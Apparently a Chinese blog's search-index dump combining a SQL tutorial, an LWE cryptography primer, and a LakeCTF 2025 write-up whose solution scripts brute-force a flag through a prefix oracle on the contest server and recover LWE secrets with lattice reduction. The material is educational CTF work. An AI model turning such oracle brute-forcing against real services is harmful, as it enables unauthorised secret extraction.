, &#x27; C4 &#x27; ,232 ,80000 ,3) , (2127 , &#x27; Kopernikus &#x27; , &#x27; C3 &#x27; ,310 ,65000 ,5) , (2128 , &#x27; Aristoteles &#x27; , &#x27; C4 &#x27; ,250 ,85000 ,1) , (2133 , &#x27; Popper &#x27; , &#x27; C3 &#x27; ,52 ,68000 ,1) , (2134 , &#x27; Augustinus &#x27; , &#x27; C3 &#x27; ,309 ,55000 ,5) , (2136 , &#x27; Curie &#x27; , &#x27; C4 &#x27; ,36 ,95000 ,3) , (2137 , &#x27; Kant &#x27; , &#x27; C4 &#x27; ,7 ,98000 ,1))SELECT persnr , name , paygrade , room , salary , taxclassFROM Professors; 又或者是之前这个例子： 1234SELECT NameFROM Students, (SELECT AVG(Semester) AS avg_semester FROM Students) avgWHERE Semester &lt; avg_semester 改成用WITH AS就是： 12345WITH avg AS (SELECT AVG(Semester) AS avg_semester FROM Students)SELECT NameFROM Students, avgWHERE Semester &lt; avg_semester 同时命名多个临时结果时只需要写一个WITH： 123456789101112WITH examination ( MatrNr , CourseNr , PersNr , Grade ) as ( SELECT * FROM pruefen UNION VALUES (29120 ,0 ,0 ,3.0) , (29555 ,0 ,0 ,2.0) , (29555 ,0 ,0 ,1.3) , (29555 ,0 ,0 ,1.0)) ,grades ( Name , MatrNr , Semester , Grade ) as ( SELECT s . name , s . matrnr , semester , avg ( Grade ) FROM studenten s , examination p WHERE s . matrnr = p. matrnr GROUP BY s. name , s. matrnr , semester) COALESCECOALESCE 是 SQL 里的空值处理函数： 按从左到右的顺序，返回第一个不是 NULL 的值；如果全是 NULL，就返回 NULL。 1COALESCE(a, b, c, 0) 等价于：如果 a 不是 NULL 返回 a，否则看 b，否则看 c，否则返回 0。 并且 12SELECT COALESCE(description, &#x27;None&#x27;)FROM sometable 等价于 1234SELECT CASE WHEN description is NOT NULL THEN description ELSE &#x27;NONE&#x27; ENDFROM sometable 处理字符串字符串匹配： Like：% 任意长度（可空），_ 单字符 常见字符串函数（SQL-92/常见实现）： SUBSTRING(str, start, len) UPPER(str)（也常见 LOWER） 字符串拼接： 标准：|| 也提到某些系统有 + 或 CONCAT(a,b)（方言差异） 建表基础12345CREATE TABLE Students ( StudNr INT, Name VARCHAR(50), Semester INT); 含义： CREATE TABLE 表名 (...)：创建表 括号里每行：列名 数据类型 常见数据类型（不同库略有差别）： 整数：INT / BIGINT 小数：DECIMAL(p,s)（精确）/ DOUBLE（浮点） 字符串：VARCHAR(n) / TEXT 日期时间：DATE / TIMESTAMP 布尔：BOOLEAN 约束但我们往往需要加上些条件，比如说非空，指定主键： 主键PRIMARY KEY（唯一 + 非空） NOT NULL（不允许空） UNIQUE（不允许重复） DEFAULT（缺省值） CHECK（自定义规则） 1Grade DECIMAL(2,1) CHECK (Grade &gt;= 1.0 AND Grade &lt;= 5.0) 例子： 123456CREATE TABLE Professors ( PersNr INT PRIMARY KEY, Name VARCHAR(50) NOT NULL, Level VARCHAR(2), Room INT); CTASCREATE TABLE AS SELECT（简称 CTAS），就是用查询结果建表。 例子： 1234CREATE TABLE C4_Professors ASSELECT PersNr, Name, RoomFROM ProfessorsWHERE Level = &#x27;C4&#x27;; 特点： 新表会包含查询出来的列 很多数据库会把类型推导出来 约束（主键/外键/NOT NULL 等）通常不会自动带过去（不同库细节不同），需要另加 临时表（TEMP / TEMPORARY）只在当前会话存在，断开就没了： 1234CREATE TEMP TABLE tmp_top_students ASSELECT StudNr, AVG(Grade) AS avg_gradeFROM testGROUP BY StudNr; 窗口函数（Window functions）窗口函数（window function）可以把它理解成：“对每一行，都能基于‘一组相关的行’计算出一个值，但又不会把行合并掉”。 窗口函数一般写在 SELECT部分（也可用于 ORDER BY）。并且由于窗口函数的计算发生在 WHERE/GROUP BY/HAVING 之后，因此通常不能直接出现在这些子句（以及 JOIN ON）里。 和之前的分组（GROUP BY）的区别： 普通聚合 + GROUP BY：会把多行“压成一行”（一组只剩一行）。 窗口函数：每一行都还在，但可以在每一行旁边附加一个聚合/排名/累计值。 窗口函数的典型形式是： 12345&lt;窗口函数&gt;(...) OVER ( PARTITION BY ... ORDER BY ... &lt;frame&gt;) PARTITION BY ...：按什么分组（每组独立算） ORDER BY ...：组内顺序（排名/累计/相邻必备） Frame：ROWS ... / RANGE ... ROWS BETWEEN 2 PRECEDING AND 2 FOLLOWING（按行数滑窗） RANGE BETWEEN 5000 PRECEDING AND 5000 FOLLOWING（按值范围滑窗） 例子1：比如说我们同时想知道每个学生上的课的总数以及具体是哪些课的话，就需要： 123456SELECT s.name, l.Title, COUNT(*) OVER (PARTITION BY a.StudNr) AS total_attended_lecturesFROM Students s, Lectures l, attend aWHERE s.StudNr = a.StudNr AND l.LectureNr = a.LectureNr; 或者 123456SELECT s.name, l.Title, SUM(1) OVER (PARTITION BY a.StudNr) AS total_attended_lecturesFROM Students s, Lectures l, attend aWHERE s.StudNr = a.StudNr AND l.LectureNr = a.LectureNr; 也是一样的效果。 例子2：假如我们现在只关注现有的test表，想知道每个学生的排名： 123SELECT s.name, t.Grade, rank()OVER ( ORDER BY t.Grade ASC)FROM Students s, test tWHERE s.StudNr = t.StudNr 这里的rank会自动实现跳号的功能，即如果A,B的值为1，C的值为2，那么A,B的排名都是1，C的排名会自动变成3，而不是2。 常用的窗口函数1）排名类： 用来给每行一个名次/序号。 ROW_NUMBER()：每行一个唯一序号（不管并列）（1,2,3,4…） RANK()：并列同名次，会跳号（1,1,3…） DENSE_RANK()：并列同名次，不跳号（1,1,2…） PERCENT_RANK()：把排名映射到 0~1（相对排名） CUME_DIST()：累计分布（&lt;= 当前行的比例） NTILE(n)：分桶，把排序后的行分成 n 份（比如分成 4 桶做四分位） 2）聚合类（在GROUP BY里用的聚合函数也可以用在窗口上）： SUM(...) OVER (...)：组内总和 / 累计和 AVG(...) OVER (...)：组内平均 / 滑动平均 COUNT(...) OVER (...)：组内计数 / 累计计数 MIN/MAX(...) OVER (...)：组内最小/最大（也可做滚动最小/最大） 3）取相邻对象（分析趋势、做差分） LAG(x, k, default)：往前第 k 行的 x（默认 k=1） LEAD(x, k, default)：往后第 k 行的 x FIRST_VALUE(x)：窗口内第一行的 x LAST_VALUE(x)：窗口内最后一行的 x NTH_VALUE(x, n)：窗口内第 n 行的 x（不是所有库都有） 递归/Recursion递归的基本框架： 12345678910111213WITH RECURSIVE 名字(列...) AS ( -- 1. 基础部分（base case / anchor） SELECT ... UNION [ALL] -- 2. 递归部分（recursive step） SELECT ... FROM 名字 ... -- 这里引用自己 ...)SELECT ...FROM 名字; SQL里递归的写法和Induction/Iteration一样。先定义base case，再一层一层递进。 或者说是先给出起始集合，再反复应用递推规则，不断扩张结果集合，直到没有新东西为止。 而不是像其他编程语言里一样一直调用自己，直到碰到base case，然后停止。 在此基础上我们还可以通过定义一列新的内容（次数，长度等）以及增加基于这列信息的判断条件，来实现控制循环次数（上限）。（见例子3） 例子1生成1-5 1234567891011WITH RECURSIVE nums(n) AS ( SELECT 1 UNION ALL SELECT n + 1 FROM nums WHERE n &lt; 5)SELECT * FROM nums; 例子2假设我们现在希望查询“Der Wiener Kreis”(LectureNr=5259) 这门课的的所有前置课程（包括直接和间接）。 普通的查找直接前置课程： 12345678SELECT TitleFROM LecturesWHERE LectureNr IN ( SELECT Predecessor FROM require r, Lectures l WHERE r.Successor = l.LectureNr AND l.Title = &#x27;Der Wiener Kreis&#x27;) 查询第n轮前置就是： 1234567891011select v1.Predecessorfrom require v1, ... require vn_minus_1, require vn, require vwhere v1.Predecessor = v2.Successor and ... vn_minus_1.Predecessor = vn.Successor and vn.Predecessor = v.LectureNr and v.Title = &#x27;Der Wiener Kreis&#x27;; 我们把这个完整查询拆成2步： 利用递归创建子查询（临时表），在原来require表的基础上添加所有间接前置课程 1234567891011121314WITH RECURSIVE TransPrereq (Prereq, Successor) AS ( -- 递归的基础查询 SELECT Predecessor, Successor FROM require UNION ALL -- 递归部分 (Prereq -&gt; ... -&gt; Successor) SELECT t.Prereq, r.Successor FROM TransPrereq t, require r WHERE t.Successor = r.Predecessor)SELECT *FROM TransPrereq 每次递归时相当于有这样一个链： 1t.Prereq -&gt; t.Successor = r.Predecessor -&gt; r.Successor 我们将一头一尾加进结果里。 在里面找’Der Wiener Kreis’的所有前置课程 合并起来： 1234567891011121314151617181920WITH RECURSIVE TransPrereq (Prereq, Successor) AS ( -- 递归的基础查询 SELECT Predecessor, Successor FROM require UNION ALL -- 递归部分 (Prereq -&gt; ... -&gt; Successor) SELECT t.Prereq, r.Successor FROM TransPrereq t, require r WHERE t.Successor = r.Predecessor)SELECT TitleFROM LecturesWHERE LectureNr IN ( SELECT Prereq FROM TransPrereq t, Lectures l WHERE t.Successor = l.LectureNr AND l.Title = &#x27;Der Wiener Kreis&#x27;) 例子3考虑下面这个图： 用SQL表示是这样的： 123456789101112WITH recursive singleDirection (a ,b ) as ( SELECT * FROM ( VALUES (1 ,2) , (2 ,4) , (1 ,3) , (3 ,4) , (3 ,5) , (2 ,5) , (5 ,6) , (4 ,6) , (6 ,7) ) as graph) ,undirectedGraph as ( SELECT * FROM singleDirection UNION ALL SELECT b , a FROM singleDirection) 如果我们现在想判断从1出发是否能到6，我们就可以这样： 利用递归生成一张查询结果表，列出所有可到达的pair 然后找(1,6)是否在里面 1234567891011121314151617181920212223WITH recursive singleDirection (a ,b ) as ( SELECT * FROM ( VALUES (1 ,2) , (2 ,4) , (1 ,3) , (3 ,4) , (3 ,5) , (2 ,5) , (5 ,6) , (4 ,6) , (6 ,7) ) as graph) ,undirectedGraph as ( SELECT * FROM singleDirection UNION ALL SELECT b , a FROM singleDirection) ,hull (a , b) as ( SELECT * FROM undirectedGraph UNION SELECT fst .a , snd . b FROM hull fst , undirectedGraph snd WHERE fst . b = snd .a)SELECT *FROM hullWHERE a = 6 and b = 1; 为了避免无穷展开，我们现在加个限制：图的直径为4，即不考虑长度超过4的路径，那么就可以加一列来记录路径长度并且限制长度： 12345678910111213141516171819202122232425WITH recursive singleDirection (a , b) as ( SELECT * FROM ( VALUES (1 ,2) , (2 ,4) , (1 ,3) , (3 ,4) , (3 ,5) , (2 ,5) , (5 ,6) , (4 ,6) , (6 ,7) ) as graph) ,undirectedGraph (a , b) as ( SELECT * FROM singleDirection UNION ALL SELECT b , a FROM singleDirection) ,hull (a , b , dist ) as ( SELECT a , b , 1 FROM undirectedGraph UNION ALL SELECT fst .a , snd .b , dist + 1 FROM hull fst , undirectedGraph snd WHERE fst . b = snd .a and dist &lt;= 4)SELECT min ( dist )FROM hullWHERE a = 6 and b = 1; PostgreSQLpgvectorpgvector是PostgreSQL的一个拓展，用于直接做向量存储与相似检索。 定义向量列 比如说定义10维的vector列： 1234CREATE TABLE items ( id bigserial PRIMARY KEY, embedding vector(10)); （embedding只是列名） 插入向量 12INSERT INTO items (embedding)VALUES (&#x27;[1,2,3,4,5,6,7,8,9,10]&#x27;); 查看向量维度 123SELECT embedding.dim FROM items LIMIT 1; 运算符与距离度量 运算符 含义 &lt;-&gt; L2（欧氏距离） &lt;#&gt; negative inner product（负内积） &lt;=&gt; cosine distance（余弦距离） &lt;+&gt; L1（曼哈顿距离） &lt;~&gt; Hamming distance（二值向量） &lt;%&gt; Jaccard distance（二值向量） 例子：计算距离并输出一个dist列 12345SELECT id, embedding &lt;-&gt; &#x27;[1,2,3,4,5,6,7,8,9,10]&#x27;::vector AS distFROM itemsORDER BY dist; 会计算embedding列的所有vector到[1,2,3,4,5,6,7,8,9,10]的L2距离，然后按照或者距离进行排序。（注意，ORDER BY默认是升序） 例子2：找某条记录的近邻 123456SELECT idFROM itemsORDER BY embedding &lt;-&gt; ( SELECT embedding FROM items WHERE id = 123)LIMIT 5; 例子3：给每个找近邻 假设有一个表wiki(word TEXT, embedding vector(50))。 123456789SELECT w1.word, w2.wordFROM wiki w1CROSS JOIN LATERAL ( SELECT word FROM wiki WHERE w1.word &lt;&gt; word ORDER BY w1.embedding &lt;=&gt; embedding LIMIT 3) AS w2; CROSS JOIN：笛卡尔连接（不写 ON 条件） LATERAL (subquery)：这个 subquery 会根据当前 w1 变化而变化 所以对外层每一行 w1，运行一次括号里的子查询，得到若干行结果，然后把这些结果行和当前 w1 拼在一起输出。","categories":[{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/en/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/en/tags/SQL/"}]},{"title":"LWE(Learning With Error) 入门","slug":"CTF/Crypto/LWE-入门","date":"2025-12-03T18:56:05.000Z","updated":"2025-12-12T22:51:34.446Z","comments":true,"path":"2025/12/03/CTF/Crypto/LWE-入门/","permalink":"https://archer-baiyi.github.io/en/2025/12/03/CTF/Crypto/LWE-%E5%85%A5%E9%97%A8/","excerpt":"","text":"从传统公钥密码到 LWE如今我们日常使用的主流公钥密码体系（比如 RSA、Diffie–Hellman、椭圆曲线密码 ECC），背后依赖的核心困难问题大多是两类： Factorization（大整数分解）：RSA 的安全性基础 Discrete Logarithm（离散对数）：DH / ECC 的安全性基础 在经典计算机上，这两类问题目前都没有已知的多项式时间算法，因此它们在过去几十年里支撑了几乎整个互联网的密钥交换与身份认证体系。 但问题出在这些年的新研究：量子计算。 一旦具备足够规模、容错能力的量子计算机，Shor 算法可以在多项式时间内求解整数分解和离散对数——也就是说，RSA/DH/ECC这些传统公钥加密方法将会失去安全性。为了应对这种潜在威胁，我们需要寻找一类在量子模型下仍然被认为困难的数学问题，这就是所谓的 Post-Quantum Cryptography（后量子密码）。 在候选的后量子方向里，格（Lattice） 密码学是最重要的一支。 格可以简单理解成是这样的集合： L ={\\biggl \\{}\\sum _{i=1}^{n}a_{i}v_{i}\\mathbin {\\bigg \\vert } a_{i}\\in \\mathbb {Z} {\\biggr \\}}格上有一些非常自然但又非常难的问题，比如： 找到某个格里最短的非零向量（SVP 类问题） 在某种近似意义下找“足够短”的向量（GapSVP/SIVP 等） 这类问题的特点是： 目前没有已知的像Shor高效一样的量子算法能解决， 更关键的是，很多格密码构造能给出非常强的理论背书：把“平均情况下随机实例的困难性”与“最坏情况下格问题的困难性”联系起来（worst-case → average-case 的味道） 换句话说：攻击者不是只需要碰到一个弱实例，而是被迫面对一种更“结构性”的困难来源。 那么我们该怎么样利用格的特殊复杂性来设计一些更具体的问题，并在此基础上设计加密流程呢？ 一个非常成功的实现便是LWE（Learning With Errors，带误差学习）。 LWE相信大家都学过，这样的一个线性方程组： b = As其中$b \\in \\mathbb{Z}^n, A \\in \\mathbb{Z}^{n \\times m}$已知 , $s \\in \\mathbb{Z}^m$未知，可以利用高斯算法或者很多其他的numerical的算法高效地解出来。 而LWE的想法便是在右边加上一个随机的error $e \\in \\mathbb{Z}^m$： b = As + e这样一来就很难通过这些等式准确地求出来s。 并且它非常符合公钥加密的特点：我们有一个密钥（这里是$s$），然后我们进行一番操作得到一个公钥（这里是$A,b$）。但是其他人无法通过公钥将密钥还原出来。 Regev LWE Public-Key Encryption这个加密方案是由Oded Regev在2005 年提出的，出自他在ACM STOC 2005的论文 “On lattices, learning with errors, random linear codes, and cryptography”。 整体加解密流程：（q为任意质数） 生成密钥： 生成一个随机的矩阵$A \\in \\mathbb{Z}^{n \\times m}_q$，公钥。 生成一个随机向量$s \\in \\mathbb{Z}^m_q$，私钥 计算公钥$b \\in \\mathbb{Z}^n_q$： b = A \\cdot s + e这里$e$是一个误差向量(Error)，系数非常小的向量。 加密： 生成一个一次性的小系数的随机向量$r$ 计算密文$u$ ： u = A^T \\cdot r 计算密文$v$： v = b^T \\cdot r + m \\cdot \\lfloor q/2 \\rfloor这一步对二进制消息$m$的处理是为了尽量将$m$中的0，1区分开。 密文：$(u,v)$ 解密： 计算 \\begin{align*} v - s^T u &= (b^T r + m \\cdot \\lfloor q/2 \\rfloor) - s^T A^T r\\\\ &= ((As + e)^T r + m \\cdot \\lfloor q/2 \\rfloor ) - s^T A^T r\\\\ &= s^T A^T r + e^T r + m \\cdot \\lfloor q/2 \\rfloor - s^T A^T r\\\\ &= e^T r + m \\cdot \\lfloor q/2 \\rfloor \\end{align*}因为$e,r$（的系数）都足够小，所以根据结果一位一位来还原$m$（离0更近返回0，离$\\lfloor q/2 \\rfloor$更近就返回1。）","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"LWE","slug":"LWE","permalink":"https://archer-baiyi.github.io/en/tags/LWE/"}]},{"title":"LakeCTF Quals 25-26 Writeup","slug":"CTF/比赛Writeup/LakeCTF-Quals-25-26-Writeup","date":"2025-11-29T21:37:43.000Z","updated":"2025-12-12T22:51:41.640Z","comments":true,"path":"2025/11/29/CTF/比赛Writeup/LakeCTF-Quals-25-26-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/11/29/CTF/%E6%AF%94%E8%B5%9BWriteup/LakeCTF-Quals-25-26-Writeup/","excerpt":"LakeCTF Quals 25-26比赛的题解，涉及方向：Crypto,Misc","text":"CryptoGuess Flag题目 1234567891011121314151617181920212223242526#!/usr/bin/env -S python3 -uflag = &quot;00000000000000000000000000000000&quot;print(&quot;Don&#x27;t even think to guess the flag by brute force, it is 32 digits long!&quot;)user_input = input()if not user_input.isdigit(): print(&quot;Flag only contains digits!&quot;) exit()index = 0for char in user_input: if char != flag[index]: print(&quot;Wrong flag!&quot;) exit() index += 1print(&quot;Correct flag!&quot;)print(&quot;flag is : EPFL&#123;&quot; +user_input + &quot;&#125;&quot;) 分析可以发现程序只会检查我们给的内容是否为flag的前缀，只要是就会返回Correct： 123456for char in user_input: if char != flag[index]: print(&quot;Wrong flag!&quot;) exit() index += 1print(&quot;Correct flag!&quot;) 所以本质上就是一个Oracle的题，我们只需要一位一位爆破就好。 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *import stringhost = &#x27;chall.polygl0ts.ch&#x27;port = 6001context.log_level = &#x27;error&#x27;known_flag = &quot;&quot;charset = string.digits# flag is 32 digits longfor i in range(32): found_char = False for char in charset: r = remote(host, port) test_payload = known_flag + char r.sendlineafter(b&quot;digits long!&quot;, test_payload.encode()) response = r.recvall(timeout=2).decode() if &quot;Correct flag!&quot; in response: known_flag += char print(f&quot;index : &#123;i&#125;, current flag: &#123;known_flag&#125;&quot;) found_char = True r.close() break r.close() if not found_char: breakprint(f&quot;Flag: EPFL&#123;&#123;&#123;known_flag&#125;&#125;&#125;&quot;)# index : 0, current flag: 1# index : 1, current flag: 15# index : 2, current flag: 153# index : 3, current flag: 1539# index : 4, current flag: 15392# index : 5, current flag: 153929# index : 6, current flag: 1539294# index : 7, current flag: 15392948# index : 8, current flag: 153929482# index : 9, current flag: 1539294829# index : 10, current flag: 15392948299# index : 11, current flag: 153929482999# index : 12, current flag: 1539294829992# index : 13, current flag: 15392948299929# index : 14, current flag: 153929482999293# index : 15, current flag: 1539294829992932# index : 16, current flag: 15392948299929328# index : 17, current flag: 153929482999293283# index : 18, current flag: 1539294829992932838# index : 19, current flag: 15392948299929328383# index : 20, current flag: 153929482999293283838# index : 21, current flag: 1539294829992932838382# index : 22, current flag: 15392948299929328383828# index : 23, current flag: 153929482999293283838283# index : 24, current flag: 1539294829992932838382839# index : 25, current flag: 15392948299929328383828399# index : 26, current flag: 153929482999293283838283999# index : 27, current flag: 1539294829992932838382839992# index : 28, current flag: 15392948299929328383828399923# index : 29, current flag: 153929482999293283838283999239# index : 30, current flag: 1539294829992932838382839992399# index : 31, current flag: 15392948299929328383828399923990# Flag: EPFL&#123;15392948299929328383828399923990&#125; The Phantom Menace题目 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import numpy as npimport jsontry: from flag import flagexcept: flag = &quot;redacted_this_is_just_so_that_it_works_and_you_can_test_locally.&quot;m_b = np.array([int(c) for char in flag for c in format(ord(char), &#x27;08b&#x27;)])# Parametersq = 3329n = 512k = 4f = np.array([1] + [0]*(n-1) + [1])assert len(m_b)==n# ---------- Helper functions ----------def _small_noise(n, weight=2): coeffs = np.zeros(n, dtype=int) idx = np.random.choice(n, size=weight, replace=False) signs = np.random.choice([-1, 1], size=weight) coeffs[idx] = signs return coeffsdef _vec_poly_mul(v0, v1): def _poly_mul(a, b): res = np.convolve(a, b) for i in range(n, len(res)): res[i - n] = (res[i - n] - res[i]) % q return res[:n] % q return sum((_poly_mul(a, b) for a, b in zip(v0, v1))) % qdef encrypt(A, t, m_b, r, e_1, e_2): A_T = list(map(list, zip(*A))) u = np.array([(mat + err) % q for mat, err in zip([_vec_poly_mul(row, r) for row in A_T], e_1) ]) tr = _vec_poly_mul(t, r) m = (m_b * ((q + 1)//2)) % q v = (tr + e_2 + m) % q return u, v# ---------- Key generation ----------A = np.array([np.array([np.random.randint(0, q, n) for _ in range(k)]) for _ in range(k)])s = np.array([_small_noise(n, n*2//3) for _ in range(k)])e = np.array([_small_noise(n) for _ in range(k)])t = np.array([(_vec_poly_mul(row, s) + err) % q for row, err in zip(A, e)])# ---------- Encryption -------------r = [_small_noise(n) for _ in range(k)]e_1 = [_small_noise(n) for _ in range(k)]e_2 = _small_noise(n)u, v = encrypt(A, t, m_b, r, e_1, e_2)# ---------- Saving key ---------------keys = &#123; &quot;s&quot;:s.tolist(), &quot;u&quot;:u.tolist(), &quot;v&quot;:v.tolist()&#125;with open(&quot;keys.json&quot;, &quot;w&quot;) as f: f.write(json.dumps(keys)) 分析这道题是关于LWE (Learning With Errors)的，所有的运算都是在多项式环$R_q = \\mathbb{Z}_q[x] / (x^n + 1)$ 里的运算。 我们先来看一下具体的加密流程： 生成密钥： 生成一个随机的$k \\times k$（这道题里是$k=4$）矩阵$A$，公钥。 生成一个随机小系数（-1, 0, 1之类的）向量$s$，私钥 计算公钥t： t = A \\cdot s + e这里 $e$ 是一个误差向量(Error)，也是系数非常小的随机多项式。 加密： 消息编码： 将二进制消息转换成多项式$m$。需要尽量将0和1区分开。 如果是0：编码为系数$0$。 如果是1：编码为系数$\\lceil q/2 \\rceil \\approx 1665$。 生成一个一次性的小系数的随机向量 $r, e_1, e_2$。 计算密文$u$ ： u = A^T \\cdot r + e_1 计算密文$v$： v = t^T \\cdot r + e_2 + m 因为这道题直接把密钥s也给我们了，所以我们直接考虑正常情况下该怎么解密就好。 注意到： \\begin{align*} v - s^T u &= (t^T r + e_2 + m) - s^T (A^T r + e_1)\\\\ &= ((As + e)^T r + e_2 + m) - s^T A^T r - s^T e_1\\\\ &= (s^T A^T r + e^T r + e_2 + m) - s^T A^T r - s^T e_1\\\\ &= m + e^T r + e_2 - s^T e_1 \\end{align*}由于多余的部分$e^T r + e_2 - s^T e_1$是我们有意生成的系数很小的噪音向量，所以可以很轻易地还原明文$m$。 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import jsonimport numpy as npq = 3329n = 512with open(&quot;keys.json&quot;, &quot;r&quot;) as f: data = json.load(f) s = np.array(data[&#x27;s&#x27;]) # 私钥u = np.array(data[&#x27;u&#x27;])v = np.array(data[&#x27;v&#x27;])# 直接从题里复制过来def _vec_poly_mul(v0, v1): def _poly_mul(a, b): res = np.convolve(a, b) for i in range(n, len(res)): res[i - n] = (res[i - n] - res[i]) % q return res[:n] % q return sum((_poly_mul(a, b) for a, b in zip(v0, v1))) % q# v - (s * u)s_dot_u = _vec_poly_mul(s, u)message_poly = (v - s_dot_u) % q# 将多项式系数解码为二进制位bits = []# 原始加密逻辑: 1 被缩放为 ~q/2 (约1664), 0 被缩放为 0# 使用 q/4 和 3q/4 作为阈值来判断lower_bound = q // 4upper_bound = 3 * q // 4for coeff in message_poly: if lower_bound &lt; coeff &lt; upper_bound: bits.append(1) else: bits.append(0)flag = &quot;&quot;for i in range(0, len(bits), 8): byte = bits[i:i+8] if len(byte) &lt; 8: break # 将 [0, 1, 1, 0...] 列表转为字符串 &quot;0110...&quot; 再转为整数 char_code = int(&quot;&quot;.join(map(str, byte)), 2) flag += chr(char_code)print(&quot;flag:&quot;, flag)# EPFL&#123;y0u_w3r3_r1ght_m4a5t3r_th3_n3g0t14t410n5_w3r3_5h0rt_ot3zhe&#125; Revenge of the Sith题目 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import numpy as npimport json# messagetry: from flag import flagexcept: flag = &quot;redacted_this_is_just_so_that_it_works_and_you_can_test_locally.&quot;m_process = [int(c) for char in flag for c in format(ord(char), &#x27;08b&#x27;)]# Parametersq = 251n = 16k = 2f = np.array([1] + [0]*(n-1) + [1])m_b = np.array([m_process[i:i+16] for i in range(0, len(m_process), n)])assert len(m_b[0])%n == 0batch_size = m_b.shape[0]# ---------- Helper functions ----------def _small_noise(n, weight=2): coeffs = np.zeros(n, dtype=int) idx = np.random.choice(n, size=weight, replace=False) signs = np.random.choice([-1, 1], size=weight) coeffs[idx] = signs return coeffsdef _vec_poly_mul(v0, v1): def _poly_mul(a, b): res = np.convolve(a, b) for i in range(n, len(res)): res[i - n] = (res[i - n] - res[i]) % q return res[:n] % q return sum((_poly_mul(a, b) for a, b in zip(v0, v1))) % qdef encrypt(A, t, m_b_batch, r_batch, e_1_batch, e_2_batch): A_T = list(map(list, zip(*A))) u_list = [] v_list = [] for b in range(batch_size): r = r_batch[b] e_1 = e_1_batch[b] e_2 = e_2_batch[b] m_b = m_b_batch[b] u = np.array([(mat + err) % q for mat, err in zip([_vec_poly_mul(row, r) for row in A_T], e_1) ]) tr = _vec_poly_mul(t, r) m = (m_b * ((q + 1)//2)) % q v = (tr + e_2 + m) % q u_list.append(u) v_list.append(v) return np.array(u_list), np.array(v_list)# ---------- Key generation ----------A = np.array([np.array([np.random.randint(0, q, n) for _ in range(k)]) for _ in range(k)])s = np.array([_small_noise(n, n//2) for _ in range(k)])e = np.array([_small_noise(n) for _ in range(k)])t = np.array([(_vec_poly_mul(row, s) + err) % q for row, err in zip(A, e)])# ---------- Encryption ----------r_batch = np.array([[_small_noise(n) for _ in range(k)] for _ in range(batch_size)])e_1_batch = np.array([[_small_noise(n) for _ in range(k)] for _ in range(batch_size)])e_2_batch = np.array([_small_noise(n) for _ in range(batch_size)])u, v = encrypt(A, t, m_b, r_batch, e_1_batch, e_2_batch)# ---------- Saving key ---------------keys = &#123; &quot;A&quot;: A.tolist(), &quot;t&quot;: t.tolist(), &quot;u&quot;: u.tolist(), &quot;v&quot;: v.tolist()&#125;with open(&quot;keys.json&quot;, &quot;w&quot;) as f: f.write(json.dumps(keys)) 分析这道题也是LWE。只不过这次没有再给我们密钥了。 加密的流程和上一题是一样的： \\begin{align*} t &= A \\cdot s + e\\\\ u &= A^T \\cdot r + e_1\\\\ v &= t^T \\cdot r + e_2 + m\\\\ \\end{align*}由于参数$n, q, s, e$都很小，我们可以通过构造格来求出$s$。 注意到： \\begin{align*} &t \\equiv A \\cdot s + e \\pmod q\\\\ \\Leftrightarrow \\ &A \\cdot s + e = t + q \\cdot k\\\\ \\Leftrightarrow \\ &A \\cdot s + q \\cdot (-k) - t = -e \\end{align*}我们可以考虑这样的矩阵构造： L = \\begin{pmatrix} qI & 0 & 0 \\\\ A^T & I & 0 \\\\ -t^T & 0 & 1 \\end{pmatrix}定义$k’:=-k$，则有： (k', \\ s, \\ 1) \\cdot L = (-e, \\ s, \\ 1)（可以这样一步一步构造出来这个矩阵： 因为一定要把$A,t$塞进矩阵里（因为这是唯二和$s$真正相关的信息了），所以直接把上面那个式子都塞进矩阵，也就是说第一列里会有$q, A, t$。 从第一列推出来左乘的这个向量为$(k’, \\ s, \\ 1)$ 因为我们最终的目的是求这个$s$，所以它一定需要出现在右边的目标向量里，所以矩阵的第二列就中间部分有一个单位矩阵$I$ 最后因为没有什么额外的信息了，并且我们需要确保目标向量的norm尽量小，所以直接选1即可。 ） 由于$s, e$都很小，所以用LLL大概率可以得到这个这个向量，从而得到$s$。得到$s$了之后就可以用上一题提到的方法求得明文了。 顺带一提，LLL算法旨在找到格的一组“几乎正交”的基，其中第一个基向量通常就是格里的最短向量（或近似最短）。LLL 是一个近似算法（Approximation Algorithm）。它不保证找到真正的最短向量（SVP），它只保证找到一个“相对短”的向量。LLL 输出的最短向量 $v_{LLL}$ 与真正的最短向量 $v_{shortest}$ 之间满足： ||v_{LLL}|| \\le 2^{(n-1)/4} \\cdot ||v_{shortest}||如果维度稍微大一点（比如 $n=120$），或者噪声 $e$ 稍微大一点，LLL 可能就找不到私钥了。这时候我们需要用更强的算法：BKZ (Block-Korkin-Zolotarev)： BKZ是LLL的升级版。它不再一次性处理整个矩阵，而是把矩阵分成小块（Block），在每个小块里做穷举搜索（SVP）。 代码用sage写的，因为需要用到LLL： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183import jsonq = 251n = 16k = 2# ================= 辅助函数 =================# 将多项式系数列表转换为负循环矩阵 (Negacyclic Matrix)# 对应模 x^16 + 1 的乘法def make_negacyclic_matrix(coeffs): mat = [] # 填充第一列 col = list(coeffs) + [0] * (n - len(coeffs)) # 生成后续列 current = col[:] cols = [current[:]] for _ in range(n - 1): # 旋转并取反: [c0, c1, ... c15] -&gt; [-c15, c0, ... c14] last = current.pop() current.insert(0, -last) cols.append(current[:]) # Sage中的Matrix是行向量形式，所以我们需要构造后再转置， # 或者直接按行构造。这里按列构造比较直观，最后转置。 return matrix(ZZ, cols).transpose()def solve(): with open(&quot;keys.json&quot;, 